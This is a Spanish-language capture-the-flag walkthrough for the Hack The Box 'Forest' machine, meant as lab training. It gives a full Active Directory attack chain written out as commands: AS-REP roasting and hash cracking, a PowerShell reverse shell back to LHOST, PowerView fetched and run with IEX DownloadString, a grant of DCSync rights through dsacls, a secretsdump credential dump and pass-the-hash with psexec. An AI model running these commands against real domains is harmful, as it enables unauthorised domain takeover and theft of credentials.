# Forest (HTB) — Guía Detallada paso a paso

> **Objetivo:** comprometer un dominio AD en la máquina **Forest** (HTB) partiendo de enumeración, **AS‑REP Roasting**, acceso por **WinRM**, abuso de **Exchange Windows Permissions → DCSync**, y **Pass‑the‑Hash** para obtener `root.txt`.
>
> **Uso previsto:** laboratorios/CTF (HTB). No aplicar en entornos donde no tengas autorización.

---

## 0) Preparación del entorno (Kali)

Variables y `/etc/hosts`:

```bash
export TARGET=10.129.246.69     # 👉 Sustituye por la IP actual del box
echo "$TARGET"

# Registrar nombres en /etc/hosts (para htb.local y FOREST)
sudo sed -i '/FOREST/d' /etc/hosts
echo "$TARGET FOREST FOREST.htb.local htb.local" | sudo tee -a /etc/hosts

# Carpetas de trabajo
mkdir -p nmap ldap creds
```

---

## 1) Enumeración de puertos con Nmap

### 1.1 Escaneo rápido de todos los puertos
```bash
sudo nmap -p- --min-rate 5000 -sS -n -Pn $TARGET -oA nmap/full
```
- `-p-` todos los puertos.
- `--min-rate 5000` acelera el envío de probes.
- `-sS` SYN scan.
- `-n` sin DNS; `-Pn` sin ping previo (host puede filtrar ICMP).
- `-oA` guarda en 3 formatos (`.nmap`, `.gnmap`, `.xml`).

### 1.2 Filtrar puertos abiertos y escaneo de servicios
```bash
ports=$(grep -oP '\d{1,5}/open' nmap/full.gnmap | cut -d/ -f1 | sort -un | tr '\n' ',' | sed 's/,$//')
sudo nmap -p$ports -sCV -Pn -oA nmap/ports $TARGET
```
- Pipeline extrae puertos abiertos del `.gnmap`.
- `-sCV` detecta versiones + scripts básicos.

**Puertos clave en Forest:** 53 (DNS), 88 (Kerberos), 135/445 (RPC/SMB), 389/636 (LDAP/LDAPS), 5985 (WinRM), 3268/3269 (GC LDAP), 9389 (ADWS).

---

## 2) LDAP: BaseDN y dominio

```bash
BASEDN=$(ldapsearch -x -H ldap://$TARGET -s base -LLL defaultNamingContext | sed -n 's/^defaultNamingContext: //p')
DOMAIN=$(echo "$BASEDN" | sed 's/DC=//g;s/,/./g')
echo "BaseDN: $BASEDN"   # p.ej. DC=htb,DC=local
echo "Domain: $DOMAIN"   # p.ej. htb.local
```

**Qué hace:** interroga LDAP anónimo (`-x`) para obtener `defaultNamingContext` (el DN raíz del dominio) y lo convierte a FQDN.

---

## 3) Enumerar usuarios por SMB (anónimo)

### 3.1 Listado con `rpcclient`
```bash
rpcclient -U "" -N $TARGET -c enumdomusers
```
- `-U "" -N` → anónimo sin contraseña.
- Muestra cuentas del dominio (incluye cuentas de servicio/Exchange).

### 3.2 Depurar usuarios “reales”
```bash
rpcclient -U "" -N "$TARGET" -c enumdomusers \
  | awk -F'[][]' '/user:/{print $2}' \
  | awk '!/\$$/ && $0 !~ /^SM_/ && $0 !~ /^HealthMailbox/' \
  | sort -u > ldap/users.txt

cat ldap/users.txt
```
- Quita cuentas con `$` (máquinas), `SM_…` y `HealthMailbox…` (Exchange).

---

## 4) AS‑REP Roasting (GetNPUsers) y crack

### 4.1 Obtener hashes AS‑REP
```bash
impacket-GetNPUsers htb.local/ -dc-ip $TARGET -no-pass -usersfile ldap/users.txt -format john -outputfile creds/asrep.hashes
```
- Pide TGT sin preautenticación a cuentas con flag **DONT_REQ_PREAUTH**.
- `-format john` deja listo para John.

### 4.2 Crack con John
```bash
john creds/asrep.hashes --wordlist=/usr/share/wordlists/rockyou.txt
john --show creds/asrep.hashes
# => típico en Forest: svc-alfresco : s3rvice
```
> Si `rockyou.txt` no existe, instala `wordlists` o ajusta la ruta.

---

## 5) Acceso inicial (WinRM) y alternativa reverse shell

### 5.1 WinRM
```bash
evil-winrm -i "$TARGET" -u svc-alfresco -p 's3rvice'
```
Si conecta, ya tenés PowerShell remoto como usuario de dominio.

### 5.2 (Opcional) Reverse shell “cmd over TCP”
En **Kali**:
```bash
rlwrap nc -lvnp 4444
```
En la sesión (Evil‑WinRM o cualquier RCE):
```powershell
$c=New-Object Net.Sockets.TCPClient('LHOST',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};
while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=[Text.Encoding]::ASCII.GetString($b,0,$i);
$r=(cmd /c $d 2>&1 | Out-String);$r2=$r+'PS '+(Get-Location).Path+'> ';
$sb=[Text.Encoding]::ASCII.GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}$c.Close()
```

---

## 6) Recon en la víctima (grupos y perfil)

Útil para detectar pertenencias con privilegios:
```powershell
whoami
whoami /groups
hostname
net user svc-alfresco /domain

# Buscar frases exactas (ojo con espacios)
whoami /groups | findstr /I /C:"Exchange Windows Permissions" /C:"Account Operators" /C:"Privileged IT Accounts"
```

---

## 7) EWP (Exchange Windows Permissions) → DCSync

**Idea:** en Forest, `svc-alfresco` suele poder agregar miembros a grupos (por estar en `Account Operators`). Metiéndonos en **EWP** y renovando token, podemos modificar la DACL del dominio para darnos **DCSync** (tres Extended Rights).

### 7.1 Añadir usuario a EWP
```powershell
net group "Exchange Windows Permissions" svc-alfresco /add /domain
net group "Exchange Windows Permissions" /domain
# Re-login para refrescar token:
exit
evil-winrm -i "$TARGET" -u svc-alfresco -p 's3rvice'
whoami /groups | findstr /I /C:"Exchange Windows Permissions"
```

> Si no aparece, salir/entrar nuevamente. Si da “Access is denied”, usa la **Opción B (usuario auxiliar)**.

### 7.2 Conceder DCSync (3 ACEs) sobre el objeto del dominio
```powershell
$dn="DC=htb,DC=local"
dsacls $dn /G "HTB\svc-alfresco:CA;Replicating Directory Changes"
dsacls $dn /G "HTB\svc-alfresco:CA;Replicating Directory Changes All"
dsacls $dn /G "HTB\svc-alfresco:CA;Replicating Directory Changes In Filtered Set"
```
- **CA;Replicating Directory Changes** (GUID `1131f6aa-...`)
- **CA;Replicating Directory Changes All** (GUID `1131f6ad-...`)
- **CA;Replicating Directory Changes In Filtered Set** (GUID `89e95b76-...`)

**Verificación rápida:**
```powershell
dsacls $dn /S | findstr /I svc-alfresco
```
> A veces `dsacls /S` no muestra nombres (sale SDDL o muchísima salida). Si no lo ves, pero los comandos no dieron error, suele estar OK.

### 7.3 Opción B — Usuario auxiliar `tempUser` (más estable en Forest)
```powershell
# Crear y habilitar
net user tempUser P@ssw0rd! /add /domain
net user tempUser /active:yes /domain

# Agregar a EWP + permitir WinRM local
net group "Exchange Windows Permissions" tempUser /add /domain
net localgroup "Remote Management Users" HTB\tempUser /add

# Re-login como tempUser
exit
evil-winrm -i "$TARGET" -u tempUser -p 'P@ssw0rd!'
whoami /groups | findstr /I /C:"Exchange Windows Permissions"

# Conceder DCSync a tempUser
$dn="DC=htb,DC=local"
dsacls $dn /G "HTB\tempUser:CA;Replicating Directory Changes"
dsacls $dn /G "HTB\tempUser:CA;Replicating Directory Changes All"
dsacls $dn /G "HTB\tempUser:CA;Replicating Directory Changes In Filtered Set"
```

### 7.4 Plan C — PowerView (si `dsacls` se resiste)
En **Kali** (sirve PowerView):
```bash
python3 -m http.server 8000
# asegúrate de tener PowerView.ps1 en ese dir
```
En la sesión WinRM:
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://LHOST:8000/PowerView.ps1')
$dn=(Get-ADDomain).DistinguishedName
Add-ObjectACL -TargetDistinguishedName $dn -PrincipalIdentity tempUser -Rights DCSync
Get-ObjectACL -DistinguishedName $dn -ResolveGUIDs | ? {$_.IdentityReference -match 'tempUser'}
```

---

## 8) DCSync con `secretsdump` (Kali)

**zsh tip:** las contraseñas con `!` rompen el historial. Usa variables o comillas simples.

```bash
PASS='P@ssw0rd!'        # si usaste tempUser
impacket-secretsdump "htb.local/tempUser:${PASS}@${TARGET}" -dc-ip "$TARGET" -just-dc

# Alternativa con svc-alfresco si diste DCSync a ese usuario:
# impacket-secretsdump "htb.local/svc-alfresco:s3rvice@${TARGET}" -dc-ip "$TARGET" -just-dc

# Si hay problemas de resolución/RPC, añade también:
#   -target-ip "$TARGET"
```
**Salida esperada:** hashes **LM:NT**. Guarda el **NTLM** de `Administrator` (el **segundo** hash).

---

## 9) Pass‑the‑Hash → Admin shell

```bash
# psexec (crea servicio temporal, suele darte SYSTEM)
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_ADMIN_HASH Administrator@"$TARGET"

# wmiexec (fileless, por si psexec está restringido)
impacket-wmiexec -hashes :NTLM_ADMIN_HASH Administrator@"$TARGET"

# smbexec (otra alternativa “fileless”)
impacket-smbexec -hashes :NTLM_ADMIN_HASH Administrator@"$TARGET"
```
Dentro de la sesión:
```cmd
whoami
hostname
type C:\Users\Administrator\Desktop\root.txt
```

---

## 10) Limpieza (opcional pero recomendable)

```powershell
$dn="DC=htb,DC=local"

# Quitar ACEs DCSync
dsacls $dn /R "HTB\tempUser"
dsacls $dn /R "HTB\svc-alfresco"

# Salir de EWP y borrar usuario auxiliar
net group "Exchange Windows Permissions" tempUser /del /domain
net group "Exchange Windows Permissions" svc-alfresco /del /domain
net user tempUser /del /domain

# Borrar scripts/PS1 que subiste y restos en C:\Windows\Temp
```

---

## Troubleshooting rápido

- **`whoami /groups` no muestra EWP** → sal y vuelve a entrar tras agregarte al grupo (necesitás **token nuevo**).
- **`dsacls ... INSUFF_ACCESS_RIGHTS`** → tu token **no** trae EWP; re‑login o usa `tempUser`.
- **`secretsdump ... RemoteOperations failed`** →
  - Falta alguna ACE DCSync; repite los 3 `dsacls` o usa PowerView.
  - Verifica puertos 135/445: `nmap -Pn -p135,445 $TARGET --open`.
  - Usa `-dc-ip` y (si hace falta) `-target-ip` con la IP del DC.
- **zsh `event not found: !`** → usa `PASS='...'` o `set +H` para desactivar history expansion.
- **`psexec` falla** → prueba `wmiexec`/`smbexec` (fileless).

---

## Apéndice: GUIDs de derechos DCSync

- **Replicating Directory Changes** → `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`
- **Replicating Directory Changes All** → `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`
- **Replicating Directory Changes In Filtered Set** → `89e95b76-444d-4c62-991a-0facbeda640c`

---

## TL;DR (resumen mínimo)

1) `GetNPUsers` + `john` ⇒ **svc-alfresco : s3rvice**.  
2) `evil-winrm` con svc-alfresco.  
3) Añadir a **EWP** y **re‑login**.  
4) `dsacls` (3 ACEs) ⇒ DCSync.  
5) `secretsdump` ⇒ NTLM **Administrator**.  
6) `psexec/wmiexec` (PTH) ⇒ `root.txt`.

¡Listo! 🚀
